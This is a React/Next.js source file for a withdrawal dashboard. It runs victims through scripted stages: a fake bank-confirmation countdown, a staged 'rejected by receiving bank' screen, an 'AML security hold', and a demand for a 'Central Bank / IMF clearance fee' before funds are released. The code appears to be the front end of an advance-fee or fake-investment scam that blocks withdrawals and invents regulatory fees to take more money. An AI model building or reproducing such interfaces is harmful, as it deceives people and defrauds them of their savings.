"use client";

import { useCallback, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import {
  AlertTriangle,
  Building2,
  Loader2,
  MessageCircle,
  ShieldAlert,
  ArrowRight,
  Landmark,
} from "lucide-react";
import DashboardGate from "@/components/dashboard/DashboardGate";
import Button from "@/components/ui/Button";
import { useI18n } from "@/components/providers/I18nProvider";
import { fetchDashboardJson } from "@/lib/fetch-json";
import { useChat } from "@/components/providers/ChatProvider";

type ScriptData = {
  withdrawal: {
    id: string;
    amountUsd: number;
    methodLabel: string;
    scriptPhase: string;
    status: string;
  };
  chargeAmountUsd: number | null;
  imfClearance: { id: string; amountUsd: number; status: string } | null;
  imfClearanceFeePercent: number;
  pendingSecondsRemaining: number;
  pendingSecondsTotal: number;
  securityMessage: string;
};

type View = "pending" | "bank-rejected" | "security-hold" | "imf-clearance";

export default function WithdrawalScriptView({
  withdrawalId,
  view,
}: {
  withdrawalId: string;
  view: View;
}) {
  const router = useRouter();
  const { formatCurrency } = useI18n();
  const { openHumanSupport } = useChat();
  const [data, setData] = useState<ScriptData | null>(null);
  const [loading, setLoading] = useState(true);
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [completing, setCompleting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const load = useCallback(() => {
    setLoading(true);
    fetchDashboardJson<ScriptData>(`/api/dashboard/withdrawals/${withdrawalId}/script`)
      .then(({ data: json, error: fetchError }) => {
        if (fetchError || !json) {
          setError("Could not load withdrawal status.");
          return;
        }
        setData(json);
        setSecondsLeft(json.pendingSecondsRemaining || json.pendingSecondsTotal);
        setError(null);
      })
      .finally(() => setLoading(false));
  }, [withdrawalId]);

  useEffect(() => {
    load();
  }, [load]);

  useEffect(() => {
    if (view !== "pending" || !data || data.withdrawal.scriptPhase !== "PENDING_TIMER") return;

    if (secondsLeft <= 0) {
      if (completing) return;
      setCompleting(true);
      fetch(`/api/dashboard/withdrawals/${withdrawalId}/script`, { method: "POST", credentials: "include" })
        .then(async (res) => {
          const json = await res.json();
          if (!res.ok) throw new Error(json.error || "Confirmation failed");
          if (json.next === "bank-rejected") {
            router.replace(`/dashboard/withdrawals/${withdrawalId}/script/bank-rejected`);
          } else if (json.next === "imf-clearance") {
            router.replace(`/dashboard/withdrawals/${withdrawalId}/script/imf-clearance`);
          } else {
            router.replace("/dashboard/withdrawals");
          }
        })
        .catch((err) => {
          setError(err instanceof Error ? err.message : "Confirmation failed");
          setCompleting(false);
        });
      return;
    }

    const timer = window.setTimeout(() => setSecondsLeft((s) => Math.max(0, s - 1)), 1000);
    return () => window.clearTimeout(timer);
  }, [view, data, secondsLeft, completing, withdrawalId, router]);

  useEffect(() => {
    if (view === "bank-rejected" && data && data.withdrawal.scriptPhase !== "BANK_REJECTED") {
      if (data.withdrawal.scriptPhase === "PENDING_TIMER") {
        router.replace(`/dashboard/withdrawals/${withdrawalId}/script/pending`);
      }
    }
  }, [view, data, router, withdrawalId]);

  return (
    <DashboardGate isLoading={loading}>
      <div className="max-w-xl mx-auto space-y-6">
        {error && (
          <div className="dash-card border border-accent-red/30 bg-accent-red/5 p-4 text-sm text-white">
            {error}
          </div>
        )}

        {view === "pending" && data && (
          <div className="dash-card p-6 sm:p-8 text-center space-y-6">
            <div className="relative mx-auto h-24 w-24">
              <div className="absolute inset-0 rounded-full border-2 border-accent-gold/30 animate-ping" />
              <div className="relative flex h-24 w-24 items-center justify-center rounded-full bg-accent-gold/10 border border-accent-gold/40">
                <Loader2 className="h-10 w-10 text-accent-gold animate-spin" />
              </div>
            </div>
            <div>
              <p className="text-xs uppercase tracking-widest text-accent-gold font-semibold">Transaction pending</p>
              <h1 className="text-xl font-bold text-white mt-2">Confirming with receiving bank</h1>
              <p className="text-sm text-text-muted mt-2 leading-relaxed">
                Your {formatCurrency(data.withdrawal.amountUsd)} {data.withdrawal.methodLabel} withdrawal is being
                verified. Estimated confirmation:{" "}
                <span className="text-white font-mono">{secondsLeft}s</span>
              </p>
            </div>
            <div className="flex items-center justify-center gap-3 text-sm text-text-secondary">
              <span className="px-3 py-1 rounded-full bg-bg-tertiary">Your account</span>
              <ArrowRight size={16} className="text-accent-gold animate-pulse" />
              <span className="px-3 py-1 rounded-full bg-bg-tertiary">Receiving bank</span>
            </div>
            {completing && (
              <p className="text-xs text-text-muted">Finalizing secure handoff…</p>
            )}
          </div>
        )}

        {view === "bank-rejected" && data && (
          <div className="dash-card p-6 sm:p-8 space-y-5">
            <div className="flex items-start gap-3">
              <AlertTriangle className="text-accent-red shrink-0 mt-1" size={24} />
              <div>
                <h1 className="text-xl font-bold text-white">Transfer rejected by receiving bank</h1>
                <p className="text-sm text-text-muted mt-2 leading-relaxed">
                  The receiving institution returned a temporary system error. Your withdrawal amount
                  {data.chargeAmountUsd ? " and processing fee have" : " has"} been credited back to your account
                  balance.
                </p>
              </div>
            </div>
            <p className="text-sm text-text-secondary">
              You can try another withdrawal later or use a different payout account.
            </p>
            <Button className="w-full" onClick={() => router.push("/dashboard/withdrawals")}>
              Back to withdrawals
            </Button>
          </div>
        )}

        {view === "security-hold" && data && (
          <div className="dash-card p-6 sm:p-8 space-y-5">
            <div className="flex items-center justify-center">
              <div className="h-20 w-20 rounded-full bg-accent-red/10 border border-accent-red/30 flex items-center justify-center">
                <ShieldAlert className="h-10 w-10 text-accent-red" />
              </div>
            </div>
            <h1 className="text-xl font-bold text-white text-center">Security hold — AML verification required</h1>
            <p className="text-sm text-text-secondary leading-relaxed">{data.securityMessage}</p>
            <div className="rounded-xl border border-border bg-bg-tertiary/50 p-4 flex items-center gap-3 text-sm">
              <Loader2 className="animate-spin text-accent-gold shrink-0" size={18} />
              <span className="text-text-muted">Identity and transaction verification in progress</span>
            </div>
            <Button variant="outline" className="w-full gap-2" type="button" onClick={() => openHumanSupport()}>
              <MessageCircle size={18} />
              Contact support
            </Button>
          </div>
        )}

        {view === "imf-clearance" && (
          <ImfClearancePanel withdrawalId={withdrawalId} formatCurrency={formatCurrency} />
        )}
      </div>
    </DashboardGate>
  );
}

function ImfClearancePanel({
  withdrawalId,
  formatCurrency,
}: {
  withdrawalId: string;
  formatCurrency: (n: number) => string;
}) {
  const router = useRouter();
  const [loading, setLoading] = useState(true);
  const [imfAmount, setImfAmount] = useState(0);
  const [withdrawalAmount, setWithdrawalAmount] = useState(0);

  useEffect(() => {
    fetch(`/api/dashboard/withdrawals/${withdrawalId}/imf-clearance`, { credentials: "include" })
      .then((r) => r.json())
      .then((json) => {
        if (json.imfPayment) {
          setImfAmount(json.imfPayment.amountUsd);
          setWithdrawalAmount(json.withdrawal?.amountUsd ?? 0);
        }
      })
      .finally(() => setLoading(false));
  }, [withdrawalId]);

  if (loading) {
    return (
      <div className="dash-card p-8 flex justify-center">
        <Loader2 className="animate-spin text-accent-gold" />
      </div>
    );
  }

  return (
    <div className="dash-card p-6 sm:p-8 space-y-5">
      <div className="flex items-center justify-center gap-3">
        <Landmark className="text-accent-gold" size={28} />
        <Building2 className="text-text-muted" size={28} />
      </div>
      <h1 className="text-xl font-bold text-white text-center">Central Bank / IMF clearance fee</h1>
      <p className="text-sm text-text-secondary leading-relaxed text-center">
        Regulatory clearance is required before your {formatCurrency(withdrawalAmount)} transfer can be released.
        Pay the clearance fee below to continue.
      </p>
      <div className="rounded-xl border border-accent-gold/30 bg-accent-gold/5 p-4 text-center">
        <p className="text-xs uppercase text-text-muted">Clearance fee due</p>
        <p className="text-2xl font-bold text-accent-gold mt-1">{formatCurrency(imfAmount)}</p>
      </div>
      <div className="flex items-center justify-center gap-2 text-xs text-text-muted">
        <span className="px-2 py-1 rounded bg-bg-tertiary">Funds held</span>
        <ArrowRight size={14} />
        <span className="px-2 py-1 rounded bg-bg-tertiary">Regulatory review</span>
      </div>
      <Button className="w-full" onClick={() => router.push(`/dashboard/withdrawals/${withdrawalId}/imf-clearance/pay`)}>
        Pay clearance fee
      </Button>
      <Button variant="outline" className="w-full" onClick={() => router.push("/dashboard/withdrawals")}>
        Back to withdrawals
      </Button>
    </div>
  );
}
